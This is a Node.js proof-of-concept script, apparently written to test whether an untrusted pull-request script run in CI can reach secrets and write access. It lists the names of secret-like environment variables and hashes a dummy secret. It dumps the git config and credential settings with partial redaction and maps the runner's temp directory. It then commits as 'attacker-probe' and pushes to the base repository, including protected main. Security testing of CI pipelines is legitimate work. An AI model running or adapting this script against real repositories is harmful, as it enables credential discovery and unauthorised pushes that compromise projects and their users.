const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');

function run(command, args, options = {}) {
  const result = spawnSync(command, args, {
    encoding: 'utf8',
    ...options,
  });

  return {
    status: result.status,
    stdout: result.stdout || '',
    stderr: result.stderr || '',
    error: result.error ? String(result.error) : '',
  };
}

function redact(value) {
  return value
    .replace(/Authorization:\s*basic\s+[A-Za-z0-9+/=]+/gi, 'Authorization: basic [REDACTED]')
    .replace(/gh[opusr]_[A-Za-zA-Z0-9_]+/g, '[REDACTED_GH_TOKEN]')
    .replace(/x-access-token:[^@\s]+@/g, 'x-access-token:[REDACTED]@');
}

function writeFile(name, lines) {
  fs.writeFileSync(name, `${lines.join('\n')}\n`);
}

function walk(dir, depth) {
  if (depth < 0 || !fs.existsSync(dir)) {
    return [];
  }

  const entries = [];
  for (const item of fs.readdirSync(dir, { withFileTypes: true })) {
    const fullPath = path.join(dir, item.name);
    entries.push(`${item.isDirectory() ? 'dir' : 'file'} ${fullPath}`);
    if (item.isDirectory()) {
      entries.push(...walk(fullPath, depth - 1));
    }
  }
  return entries;
}

writeFile('proof-of-execution.txt', [
  'attacker-controlled fix script executed',
  `cwd=${process.cwd()}`,
  'marker=fourth-validation-pr',
]);

const secretNames = Object.keys(process.env)
  .filter((name) => /(TOKEN|SECRET|PASSWORD|KEY)/i.test(name))
  .sort();
const dummySecret = process.env.DUMMY_PROBE_SECRET || '';
writeFile('env-secret-surface.txt', [
  'secret_like_env_var_names=',
  ...secretNames.map((name) => `- ${name}`),
  `dummy_probe_secret_present=${dummySecret ? 'yes' : 'no'}`,
  `dummy_probe_secret_sha256_prefix=${dummySecret ? crypto.createHash('sha256').update(dummySecret).digest('hex').slice(0, 12) : 'absent'}`,
]);

const gitConfig = fs.existsSync(path.join('.git', 'config'))
  ? fs.readFileSync(path.join('.git', 'config'), 'utf8')
  : '(missing)';
const gitConfigOrigins = run('git', [
  'config',
  '--show-origin',
  '--get-regexp',
  'http\\..*extraheader|credential\\..*|url\\..*insteadof|credential.helper|core\\.sshCommand',
]);
writeFile('git-auth-surface.txt', [
  '[.git/config redacted]',
  redact(gitConfig).trimEnd(),
  '',
  '[git config --show-origin --get-regexp ... redacted]',
  redact([gitConfigOrigins.stdout, gitConfigOrigins.stderr, gitConfigOrigins.error].filter(Boolean).join('\n')).trimEnd() || '(no matches)',
]);

writeFile('runner-temp-tree.txt', [
  `RUNNER_TEMP=${process.env.RUNNER_TEMP || '(unset)'}`,
  ...walk(process.env.RUNNER_TEMP || os.tmpdir(), 2),
]);

const baseRepo = process.env.BASE_REPO;
const runId = process.env.RUN_ID || 'unknown-run';
const probeBranch = `token-write-probe-${runId}`;
const branchProbeFile = `write-probe-${runId}.txt`;

fs.writeFileSync(branchProbeFile, `probe-branch=${probeBranch}\n`);
run('git', ['config', 'user.name', 'attacker-probe']);
run('git', ['config', 'user.email', 'attacker-probe@example.invalid']);
run('git', ['add', branchProbeFile]);
const commitResult = run('git', ['commit', '-m', `probe write reach ${runId}`]);

run('git', ['remote', 'set-url', 'origin', `https://github.com/${baseRepo}.git`]);
const branchPush = run('git', ['push', 'origin', `HEAD:refs/heads/${probeBranch}`]);
const protectedPush = run('git', ['push', 'origin', 'HEAD:refs/heads/main']);

writeFile('git-write-probe.txt', [
  `base_repo=${baseRepo}`,
  `probe_branch=${probeBranch}`,
  '',
  '[commit result]',
  `status=${commitResult.status}`,
  redact(commitResult.stdout).trimEnd(),
  redact(commitResult.stderr).trimEnd(),
  '',
  '[push to disposable branch]',
  `status=${branchPush.status}`,
  redact(branchPush.stdout).trimEnd(),
  redact(branchPush.stderr).trimEnd(),
  '',
  '[push to protected main]',
  `status=${protectedPush.status}`,
  redact(protectedPush.stdout).trimEnd(),
  redact(protectedPush.stderr).trimEnd(),
]);

console.log('attacker-controlled fix script executed');
